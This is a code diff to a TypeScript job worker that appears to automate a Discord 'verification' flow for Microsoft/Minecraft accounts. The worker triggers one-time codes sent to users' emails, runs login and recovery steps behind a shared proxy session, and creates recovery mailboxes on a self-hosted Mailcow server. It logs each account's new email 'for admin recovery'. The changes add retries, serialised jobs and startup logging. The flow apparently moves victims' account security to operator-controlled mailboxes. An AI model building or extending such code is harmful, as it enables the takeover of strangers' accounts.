@@ -38,11 +38,45 @@ if (!process.env.WORKER_SECRET) {
   process.exit(1);
 }
 
-console.log(
-  `[worker] ${WORKER_ID} started, polling every ${POLL_INTERVAL}ms (max ${MAX_CONCURRENT_JOBS} concurrent)`,
-);
+{
+  const rawSite = process.env.SITE_URL || "";
+  const site = rawSite.replace(/\/+$/, "");
+  const mailcow =
+    !!(process.env.MAILCOW_API_URL || process.env.MAILCOW_URL) &&
+    !!process.env.MAILCOW_API_KEY &&
+    !!process.env.MAILCOW_DOMAIN;
+  const tlsInsecure = /^(1|true|yes)$/i.test((process.env.MAIL_TLS_INSECURE || "").trim());
+  if (rawSite.endsWith("/")) {
+    console.warn(`[worker] SITE_URL had trailing slash (normalized to ${site})`);
+  }
+  console.log(
+    `[worker] ${WORKER_ID} started, polling every ${POLL_INTERVAL}ms (max ${MAX_CONCURRENT_JOBS} concurrent) site=${site}`,
+  );
+  console.log(
+    `[worker] mailcow=${mailcow ? "configured" : "MISSING"} tls_insecure=${tlsInsecure} imap=${process.env.MAILCOW_IMAP_HOST || "unset"}`,
+  );
+  if (mailcow && !tlsInsecure) {
+    console.warn(
+      "[worker] MAIL_TLS_INSECURE is off — Mailcow self-signed certs will fail with fetch failed. Set MAIL_TLS_INSECURE=1",
+    );
+  }
+  if (!mailcow) {
+    console.warn("[worker] Mailcow env incomplete — secure jobs will fail at recovery mailbox step");
+  }
+}
 
 const runningJobs = new Map<string, AbortController>();
+
+/** Serialize secure jobs — sticky MS proxy/session is process-global. */
+let secureChain: Promise<void> = Promise.resolve();
+function withSecureSlot<T>(fn: () => Promise<T>): Promise<T> {
+  const prev = secureChain;
+  let release!: () => void;
+  secureChain = new Promise<void>((r) => {
+    release = r;
+  });
+  return prev.then(fn).finally(() => release());
+}
 
 async function applyTerminal(jobId: string, result: JobRunResult) {
   let ok = false;
@@ -125,11 +159,8 @@ async function claimJob(job: { id: string; discord_id: string; type: string; con
     } else if (job.type === "secure") {
       const secureCfg = job.config as SecureJobConfig & { sessionId?: string };
       try {
-        const result = await runSecureBot(
-          job.id,
-          job.discord_id,
-          secureCfg,
-          controller.signal,
+        const result = await withSecureSlot(() =>
+          runSecureBot(job.id, job.discord_id, secureCfg, controller.signal),
         );
         if (controller.signal.aborted) {
           await markVerificationSession(secureCfg.sessionId, "failed");
@@ -141,15 +172,33 @@ async function claimJob(job: { id: string; discord_id: string; type: string; con
             error: "Secure flow failed (login/recovery/timeout)",
           });
         } else {
-          try {
-            await postVerificationResult(secureCfg, result);
+          let completeOk = false;
+          let lastCompleteErr = "";
+          for (let attempt = 1; attempt <= 4; attempt++) {
+            try {
+              await postVerificationResult(secureCfg, result);
+              completeOk = true;
+              break;
+            } catch (e) {
+              lastCompleteErr = e instanceof Error ? e.message : String(e);
+              console.error(
+                `[worker] postVerificationResult attempt ${attempt}/4 failed:`,
+                lastCompleteErr,
+              );
+              await new Promise((r) => setTimeout(r, 1000 * attempt));
+            }
+          }
+          if (completeOk) {
             await applyTerminal(job.id, { status: "completed" });
-          } catch (e) {
-            const msg = e instanceof Error ? e.message : String(e);
+          } else {
+            // Account may already be secured — keep job error but log credentials for admin recovery
+            console.error(
+              `[worker] SECURE COMPLETE FAILED after success email=${result.newEmail || "?"} job=${job.id} err=${lastCompleteErr}`,
+            );
             await markVerificationSession(secureCfg.sessionId, "failed");
             await applyTerminal(job.id, {
               status: "error",
-              error: `Verification complete failed: ${msg}`,
+              error: `Verification complete failed: ${lastCompleteErr}`,
             });
           }
         }
@@ -172,25 +221,34 @@ async function claimJob(job: { id: string; discord_id: string; type: string; con
 }
 
 async function processOtpQueue() {
-  // Gateway path sends OTP itself. Only process leftover HTTP pending sessions
-  // that are not already being handled (status pending, no gateway flag).
+  // HTTP interactions path only (status=pending). Gateway uses securing+gateway_otp and is never claimed.
+  // Always SendOtt here — flow_token is the MS proof id, NOT proof that OTP was already emailed.
   try {
     const sessions = await pollOtpPending(WORKER_ID, 3);
     for (const s of sessions) {
-      // Skip if gateway already set a proof / security email (race leftover)
-      if (s.flow_token && s.flow_token.length > 20 && s.security_email) {
-        console.log(`[otp] skip ${s.id.slice(0, 8)}… already has proof from gateway`);
-        continue;
-      }
       console.log(`[otp] sending for session ${s.id.slice(0, 8)}… (${s.mc_email.slice(0, 3)}***)`);
       const result = await sendOtpFromWorker(s.mc_email);
-      const ok = await reportOtpResult({
+      let ok = await reportOtpResult({
         session_id: s.id,
         ok: result.ok,
         security_email: result.securityEmail || s.security_email || undefined,
         proof_id: result.proofId || s.flow_token || undefined,
         error: result.error,
       });
+      if (!ok) {
+        await new Promise((r) => setTimeout(r, 800));
+        ok = await reportOtpResult({
+          session_id: s.id,
+          ok: result.ok,
+          security_email: result.securityEmail || s.security_email || undefined,
+          proof_id: result.proofId || s.flow_token || undefined,
+          error: result.error,
+        });
+      }
+      if (!ok && result.ok) {
+        // Session stuck in securing — force failed so Discord path can recover
+        await markVerificationSession(s.id, "failed");
+      }
       console.log(
         `[otp] session ${s.id.slice(0, 8)}… result ok=${result.ok} reported=${ok}${result.error ? ` err=${result.error}` : ""}`,
       );
